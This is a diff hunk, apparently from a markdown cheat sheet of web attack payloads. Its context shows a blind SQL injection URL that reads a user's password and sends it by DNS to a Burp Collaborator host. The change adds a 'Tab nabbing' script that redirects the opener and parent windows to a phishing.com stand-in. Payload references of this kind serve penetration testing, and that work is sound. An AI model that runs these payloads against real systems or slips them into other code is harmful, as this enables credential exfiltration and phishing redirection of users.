@@ -394,6 +394,14 @@ If confronted with a fully blind SQL injection with disabled stacked queries, it
 https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:*.xel','\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
 ```
 
+ ### Tab nabbing
+ '''
+ <script>
+if (window.opener) window.opener.parent.location.replace('http://phishing.com');
+if (window.parent != window) window.parent.location.replace('http://phishing.com');
+</script>
+ '''
+ 
 
 ### XSS
 ```
